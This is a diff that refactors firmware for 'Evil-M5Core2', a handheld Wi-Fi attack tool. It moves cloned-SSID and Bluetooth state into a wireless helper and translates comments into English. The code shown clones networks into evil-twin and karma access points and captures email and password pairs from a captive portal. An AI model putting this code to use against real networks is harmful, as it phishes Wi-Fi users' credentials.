@@ -42,7 +42,6 @@
 #define LED_ENABLED false  // change this to true to get cool led effect (only on fire)
 #define GPS_ENABLED false  // Change this to true to enable GPS logging for Wardriving data
 // Also remember that bluetooth is not protected and anyone can connect to it without pincode (esp librairies issue) to ensure protection serial password is implemented
-#define BLUETOOTH_NAME "E7vhi3l0tMh53Cro0rne32"
 #define BLUETOOTH_SERIAL_PASSWORD "7h30th3r0n3"
 /*-----------------------------------------------------------------*/
 
@@ -103,8 +102,6 @@ ConnectionState connectionState = AWAITING_PASSWORD;
 const char* ssid = WIFI_SSID;
 const char* password = WIFI_PASSWORD;
 const char* accessWebPassword = WEB_ACCESS_PASSWORD;
-
-const char* bluetoothName = BLUETOOTH_NAME;
 
 String portalFiles[30]; // 30 portals max
 int numPortalFiles = 0;
@@ -169,16 +166,16 @@ bool isItSerialCommand = false;
 const long channelHopInterval = 200;
 unsigned long lastChannelHopTime = 0;
 int currentChannelDeauth = 1;
-bool autoChannelHop = true; // Commence en mode auto
+bool autoChannelHop = true; // Starts in auto mode
 int lastDisplayedChannelDeauth = -1;
-bool lastDisplayedMode = !autoChannelHop; // Initialisez à l'opposé pour forcer la première mise à jour
-unsigned long lastScreenClearTime = 0; // Pour suivre le dernier effacement de l'écran
+bool lastDisplayedMode = !autoChannelHop; // Initialize to the opposite to force the first update
+unsigned long lastScreenClearTime = 0; // To track the last screen clear
 char macBuffer[18];
 int maxChannelScanning = 13;
 // deauth and pwnagotchi detector end
 
 String ssidList[100];
-int numSsid = 0;
+
 int currentListIndex = 0;
 int topVisibleIndex = 0;
 
@@ -187,10 +184,7 @@ unsigned long previousMillis = 0;
 const long interval = 1000;
 static constexpr const gpio_num_t SDCARD_CSPIN = GPIO_NUM_4;
 
-
-String clonedSSID;
 bool isCaptivePortalOn;
-bool bluetoothEnabled;
 String selectedPortalFile;
 
 
@@ -217,8 +211,8 @@ void setup() {
             Serial.println("M5Stack BASIC/GRAY GO/FIRE FACES II Board detected.");
             break;
         default:
-            // Modèle non pris en charge ou inconnu, éventuellement définir des valeurs par défaut
-            GPS_RX_PIN = -1; // -1 signifie non configuré ou non valide
+            // Unsupported or unknown model, optionally set default values
+            GPS_RX_PIN = -1; // -1 means not configured or not valid
             GPS_TX_PIN = -1;
             Serial.println("Error detecting board.");
         break;
@@ -414,7 +408,7 @@ void setup() {
 
     // Scan for local Wifi networks
     wireless.saveOriginalMAC();
-    firstScanWifiNetworks();
+    wireless.firstScanWifiNetworks();
 #if LED_ENABLED
     led.pattern2();
 #endif
@@ -445,7 +439,7 @@ void setup() {
     // Complete hardware initialization
     led.init();
 #if GPS_ENABLED
-    Serial2.begin(9600, SERIAL_8N1, GPS_RX_PIN, GPS_TX_PIN);  //  GPS, change RX_PIN et TX_PIN if needed
+    Serial2.begin(9600, SERIAL_8N1, GPS_RX_PIN, GPS_TX_PIN);  //  GPS, change RX_PIN and TX_PIN if needed
 #endif
 
     // Define Main Menu
@@ -461,7 +455,7 @@ void setup() {
     // Define Settings Menu
     subMenuSettings.addMenuItem("Monitor Status", monitor.emptyMonitorCallback, showMonitorStatus);
     subMenuSettings.addMenuItem("Adjust Brightness", brightness);
-    subMenuSettings.addMenuItem("Toggle BLE Radio", onOffBleSerial);
+    subMenuSettings.addMenuItem("Toggle BLE Radio", showToggleBleSerial);
     subMenuSettings.addMenuItem("Check Credentials", checkCredentials);
     subMenuSettings.addMenuItem("Delete All Credentials", deleteCredentials);
     subMenuSettings.addMenuItem("Delete All Probes", deleteAllProbes);
@@ -469,9 +463,7 @@ void setup() {
     //customizeLayout();
 
     // TODO: Remove random initialization of global variables
-    clonedSSID = "Evil-M5Core2";
     isCaptivePortalOn = false;
-    bluetoothEnabled = false;
     selectedPortalFile = "/sites/normal.html"; // defaut portal
 }
 
@@ -515,51 +507,22 @@ void loop() {
     }
 }
 
-
-int scanAvailableSSID() {
-    // Scan for Wifi networks, store all found SSID to ssidList and
-    // return number of SSID found.
-    WiFi.mode(WIFI_STA);
-    WiFi.disconnect();
-    unsigned long startTime = millis();
-    int n;
-
-    while (millis() - startTime < 2000) {
-        n = WiFi.scanNetworks();
-        if (n != WIFI_SCAN_RUNNING) break;
-    }
-
-    numSsid = min(n, 100);
-    for (int i = 0; i < numSsid; i++) {
-        ssidList[i] = WiFi.SSID(i);
-    }
-
-    return n;
-}
-
-void firstScanWifiNetworks() {
-    // Run first scan of available SSID and output
-    int n = scanAvailableSSID();
-
-    if (n == 0) {
-        sendMessage("No network found ...");
-    } else {
-        sendMessage(" Near Wifi Networks : ");
-        sendMessage("-------------------");
-        for (int i = 0; i < numSsid; i++) {
-            sendMessage(String(i) + ": " + ssidList[i]);
-        }
-        sendMessage("-------------------");
-    }
-}
-
-
 void scanWifiNetworks(CallbackMenuItem& menuItem) {
     ui.writeSingleMessage("Scan in progress...", true);
-    firstScanWifiNetworks();
+    wireless.firstScanWifiNetworks();
     ui.waitAndReturnToMenu("Scan Completed");
 }
 
+void showToggleBleSerial(CallbackMenuItem& menuItem) {
+    if (wireless.getBluetoothEnabled()) {
+        ui.waitAndReturnToMenu("Bluetooth OFF");
+        sendUtilMessage("Bluetooth turned off");
+    } else {
+        ui.waitAndReturnToMenu("Bluetooth ON");
+        sendUtilMessage("Bluetooth turned on");
+    }
+    wireless.onOffBleSerial();
+}
 
 void showMonitorStatus(CallbackMenuItem& menuItem) {
     monitor.showMonitorPage();
@@ -581,11 +544,33 @@ void showBeaconAttack(CallbackMenuItem& menuItem) {
         //monitor.nextPage();
     } else if (M5.BtnB.wasReleased()) {
         // Close app and return to main menu
-        beacon.toggleAppRunning();
         beacon.closeBeaconApp();
         menuItem.deactivateCallbacks();
     } else if (M5.BtnC.wasReleased()) {
         //monitor.resetMonitorPage();
+    }
+}
+
+void deleteCredentials(CallbackMenuItem& menuItem) {
+    if (ui.confirmPopup("Delete credentials?", true)) {
+        File file = openFile("/credentials.txt", FILE_WRITE);
+
+        if (file) {
+            file.close();
+            sendMessage("-------------------");
+            sendMessage("credentials.txt deleted");
+            sendMessage("-------------------");
+            ui.waitAndReturnToMenu("Deleted successfully");
+            sendMessage("Credentials deleted successfully");
+        } else {
+            sendMessage("-------------------");
+            sendMessage("Error deleteting credentials.txt ");
+            sendMessage("-------------------");
+            ui.waitAndReturnToMenu("Error..");
+            sendMessage("Error opening file for deletion");
+        }
+    } else {
+        ui.waitAndReturnToMenu("Deletion cancelled");
     }
 }
 
@@ -612,28 +597,6 @@ void handleDnsRequestSerial() {
         checkSerialCommands(command, true);
     }
 }
-
-
-void onOffBleSerial(CallbackMenuItem& menuItem) {
-    if (bluetoothEnabled) {
-        ui.waitAndReturnToMenu("   Bluetooth OFF");
-        wireless.ESP_BT.end();
-        sendMessage("Bluetooth turned off");
-    } else {
-        WiFi.mode(WIFI_OFF);
-        WiFi.disconnect(true);
-        delay(500);
-        esp_wifi_set_promiscuous(false);
-        esp_wifi_stop();
-        esp_wifi_deinit();
-        ui.waitAndReturnToMenu("   Bluetooth ON");
-        wireless.ESP_BT.begin(bluetoothName);
-        wireless.ESP_BT.setPin("730303"); // NOT WORKING // WORK ONLY WITH esp v1.0.1 // workaround password in serial
-        sendMessage("Bluetooth turned on");
-    }
-    bluetoothEnabled = !bluetoothEnabled;
-}
-
 
 
 void listProbesSerial() {
@@ -668,7 +631,7 @@ void selectProbeSerial(int index) {
     file.close();
 
     if (selectedProbe.length() > 0) {
-        clonedSSID = selectedProbe;
+        wireless.setClonedSSID(selectedProbe);
         sendMessage("Probe selected: " + selectedProbe);
     } else {
         sendMessage("Probe index not found.");
@@ -702,7 +665,7 @@ void checkSerialCommands(String command, bool fromBluetooth) {
             //scanWifiNetworks();
             sendMessage("-------------------");
             sendMessage("Near Wifi Network : ");
-            for (int i = 0; i < numSsid; i++) {
+            for (int i = 0; i < wireless.getNumSSID(); i++) {
                 ssidList[i] = WiFi.SSID(i);
                 sendMessage(String(i) + ": " + ssidList[i]);
             }
@@ -711,8 +674,8 @@ void checkSerialCommands(String command, bool fromBluetooth) {
             selectNetwork(ssidIndex);
         } else if (command.startsWith("change_ssid ")) {
             String newSSID = command.substring(String("change_ssid ").length());
-            cloneSSIDForCaptivePortal(newSSID);
-            sendMessage("Cloned SSID changed to: " + clonedSSID);
+            wireless.setClonedSSID(newSSID);
+            sendMessage("Cloned SSID changed to: " + wireless.getClonedSSID());
         } else if (command.startsWith("set_portal_password ")) {
             String newPassword = command.substring(String("set_portal_password ").length());
             captivePortalPassword = newPassword;
@@ -735,11 +698,11 @@ void checkSerialCommands(String command, bool fromBluetooth) {
             sendMessage("MAC: " + macAddress);
             sendMessage("-------------------");
         } else if (command == "clone_ssid") {
-            cloneSSIDForCaptivePortal(currentlySelectedSSID);
-            sendMessage("Cloned SSID: " + clonedSSID);
+            wireless.setClonedSSID(currentlySelectedSSID);
+            sendMessage("Cloned SSID: " + wireless.getClonedSSID());
         } else if (command == "start_portal") {
             //createCaptivePortal();
-            sendMessage("Start portal with " + clonedSSID);
+            sendMessage("Start portal with " + wireless.getClonedSSID());
         } else if (command == "stop_portal") {
             //stopCaptivePortal();
             sendMessage("Portal Stopped ");
@@ -847,7 +810,7 @@ void checkSerialCommands(String command, bool fromBluetooth) {
 
 
 void selectNetwork(int index) {
-    if (index >= 0 && index < numSsid) {
+    if (index >= 0 && index < wireless.getNumSSID()) {
         currentlySelectedSSID = ssidList[index];
         sendMessage("SSID selection: " + currentlySelectedSSID);
     } else {
@@ -908,11 +871,11 @@ void changePortal(int index) {
 
 void showWifiList(CallbackMenuItem& menuItem) {
     const int listDisplayLimit = M5.Display.height() / 18;
-    int listStartIndex = max(0, min(currentListIndex, numSsid - listDisplayLimit));
+    int listStartIndex = max(0, min(currentListIndex, wireless.getNumSSID() - listDisplayLimit));
 
     M5.Display.clear();
     M5.Display.setTextSize(2);
-    for (int i = listStartIndex; i < min(numSsid, listStartIndex + listDisplayLimit + 1); i++) {
+    for (int i = listStartIndex; i < min(wireless.getNumSSID(), listStartIndex + listDisplayLimit + 1); i++) {
         if (i == currentListIndex) {
             M5.Display.fillRect(0, (i - listStartIndex) * 18, M5.Display.width(), 18, TFT_NAVY);
             M5.Display.setTextColor(TFT_GREEN);
@@ -930,12 +893,12 @@ void showWifiList(CallbackMenuItem& menuItem) {
         if (M5.BtnA.wasPressed()) {
             currentListIndex--;
             if (currentListIndex < 0) {
-                currentListIndex = numSsid - 1;
+                currentListIndex = wireless.getNumSSID() - 1;
             }
             //showWifiList();
         } else if (M5.BtnC.wasPressed()) {
             currentListIndex++;
-            if (currentListIndex >= numSsid) {
+            if (currentListIndex >= wireless.getNumSSID()) {
                 currentListIndex = 0;
             }
             //showWifiList();
@@ -954,7 +917,7 @@ void showWifiDetails(int &networkIndex) {
     ui.setInMenu(false);
 
     auto updateDisplay = [&](){
-        if (networkIndex >= 0 && networkIndex < numSsid) {
+        if (networkIndex >= 0 && networkIndex < wireless.getNumSSID()) {
             M5.Display.clear();
             M5.Display.setTextSize(2);
             int y = 10;
@@ -1014,19 +977,19 @@ void showWifiDetails(int &networkIndex) {
         handleDnsRequestSerial();
 
         if (M5.BtnC.wasPressed()) {
-            cloneSSIDForCaptivePortal(ssidList[networkIndex]);
+            wireless.setClonedSSID(ssidList[networkIndex]);
             ui.setInMenu(true);
             ui.waitAndReturnToMenu(ssidList[networkIndex] + " Cloned...");
             sendMessage(ssidList[networkIndex] + " Cloned...");
             break; // Sortir de la boucle
         } else if (M5.BtnA.wasPressed()) {
-            networkIndex = (networkIndex + 1) % numSsid;
+            networkIndex = (networkIndex + 1) % wireless.getNumSSID();
             updateDisplay();
         } else if (M5.BtnB.wasPressed()) {
             ui.setInMenu(true);
             break;
         } else if (M5.BtnPWR.wasClicked()) {
-            networkIndex = (networkIndex - 1 + numSsid) % numSsid;
+            networkIndex = (networkIndex - 1 + wireless.getNumSSID()) % wireless.getNumSSID();
             updateDisplay();
         }
     }
@@ -1040,18 +1003,15 @@ String bssidToString(uint8_t* bssid) {
     return String(mac);
 }
 
-void cloneSSIDForCaptivePortal(String ssid) {
-    clonedSSID = ssid;
-}
-
 void createCaptivePortal(CallbackMenuItem& menuItem) {
-    String ssid = clonedSSID.isEmpty() ? "Evil-M5Core2" : clonedSSID;
+    //String ssid = clonedSSID.isEmpty() ? "Evil-M5Core2" : clonedSSID;
+    String ssid = "Evil-M5Core2";
     WiFi.mode(WIFI_MODE_APSTA);
     if (!isAutoKarmaActive){
         if (captivePortalPassword == ""){
-            WiFi.softAP(clonedSSID.c_str());
+            WiFi.softAP(wireless.getClonedSSID().c_str());
         }else{
-            WiFi.softAP(clonedSSID.c_str(),captivePortalPassword.c_str());
+            WiFi.softAP(wireless.getClonedSSID().c_str(), captivePortalPassword.c_str());
         }
     }
 
@@ -1062,7 +1022,7 @@ void createCaptivePortal(CallbackMenuItem& menuItem) {
         String email = server.arg("email");
         String password = server.arg("password");
         if (!email.isEmpty() && !password.isEmpty()) {
-            saveCredentials(email, password, selectedPortalFile.substring(7), clonedSSID); // Assurez-vous d'utiliser les bons noms de variables
+            saveCredentials(email, password, selectedPortalFile.substring(7), wireless.getClonedSSID()); // Assurez-vous d'utiliser les bons noms de variables
             server.send(200, "text/plain", "Credentials Saved");
         } else {
             sendMessage("-------------------");
@@ -1684,46 +1644,6 @@ void displayCredentials(int index) {
 }
 
 
-void deleteCredentials(CallbackMenuItem& menuItem) {
-    if (ui.confirmPopup("Delete credentials?", true)) {
-        File file = openFile("/credentials.txt", FILE_WRITE);
-
-        if (file) {
-            file.close();
-            sendMessage("-------------------");
-            sendMessage("credentials.txt deleted");
-            sendMessage("-------------------");
-            ui.waitAndReturnToMenu("Deleted successfully");
-            sendMessage("Credentials deleted successfully");
-        } else {
-            sendMessage("-------------------");
-            sendMessage("Error deleteting credentials.txt ");
-            sendMessage("-------------------");
-            ui.waitAndReturnToMenu("Error..");
-            sendMessage("Error opening file for deletion");
-        }
-    } else {
-        ui.waitAndReturnToMenu("Deletion cancelled");
-    }
-}
-
-
-int countPasswordsInFile() {
-    File file = openFile("/credentials.txt", FILE_READ);
-
-    int passwordCount = 0;
-    while (file.available()) {
-        String line = file.readStringUntil('\n');
-        if (line.startsWith("-- Password --")) {
-            passwordCount++;
-        }
-    }
-
-    file.close();
-    return passwordCount;
-}
-
-
 void probeSniffing() {
     isProbeSniffingMode = true;
     isProbeSniffingRunning = true;
@@ -1944,7 +1864,7 @@ void startScanKarma() {
     M5.Display.clear();
     drawStopButtonKarma();
     wireless.ESP_BT.end();
-    bluetoothEnabled = false;
+    wireless.setBluetoothEnabled(false);
     esp_wifi_set_promiscuous(false);
     esp_wifi_stop();
     esp_wifi_set_promiscuous_rx_cb(NULL);
@@ -2091,7 +2011,7 @@ void executeMenuItemKarma(int indexKarma) {
 }
 
 void startAPWithSSIDKarma(const char* ssid) {
-    clonedSSID = String(ssid);
+    wireless.setClonedSSID(ssid);
     isProbeKarmaAttackMode = true;
     config.readConfigFile();
     //createCaptivePortal();
@@ -2253,7 +2173,7 @@ void listProbes() {
     sendMessage("-------------------");
     sendMessage("SSID selected: " + probes[selectedIndex]);
     sendMessage("-------------------");
-    clonedSSID = probes[selectedIndex];
+    wireless.setClonedSSID(probes[selectedIndex]);
     ui.waitAndReturnToMenu(probes[selectedIndex] + " selected");
 }
 
@@ -2564,7 +2484,7 @@ bool isAPDeploying = false;
 
 void startAutoKarma() {
     wireless.ESP_BT.end();
-    bluetoothEnabled = false;
+    wireless.setBluetoothEnabled(false);
     esp_wifi_set_promiscuous(false);
     esp_wifi_stop();
     esp_wifi_set_promiscuous_rx_cb(NULL);
@@ -2724,14 +2644,14 @@ void activateAPForAutoKarma(const char* ssid) {
         int clientCount = WiFi.softAPgetStationNum();
         if (clientCount > 0) {
             karmaSuccess = true;
-            clonedSSID = String(ssid);
+            wireless.setClonedSSID(ssid);
             isCaptivePortalOn = true;
             isAPDeploying = false;
             isAutoKarmaActive = false;
             isInitialDisplayDone = false;
             ui.setInMenu(true);
             sendMessage("-------------------");
-            sendMessage("Karma Successful for : " + String(clonedSSID));
+            sendMessage("Karma Successful for : " + wireless.getClonedSSID());
             sendMessage("-------------------");
             memset(lastSSID, 0, sizeof(lastSSID));
             newSSIDAvailable = false;
@@ -2745,7 +2665,7 @@ void activateAPForAutoKarma(const char* ssid) {
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_MODE_STA);
     wireless.ESP_BT.end();
-    bluetoothEnabled = false;
+    wireless.setBluetoothEnabled(false);
     esp_wifi_set_promiscuous(false);
     esp_wifi_stop();
     esp_wifi_set_promiscuous_rx_cb(NULL);
@@ -3302,7 +3222,7 @@ void deauthDetect() {
     M5.Lcd.setTextSize(2);
     M5.Lcd.setTextColor(WHITE, BLACK);
     wireless.ESP_BT.end();
-    bluetoothEnabled = false;
+    wireless.setBluetoothEnabled(false);
     esp_wifi_set_promiscuous(false);
     esp_wifi_stop();
     esp_wifi_set_promiscuous_rx_cb(NULL);
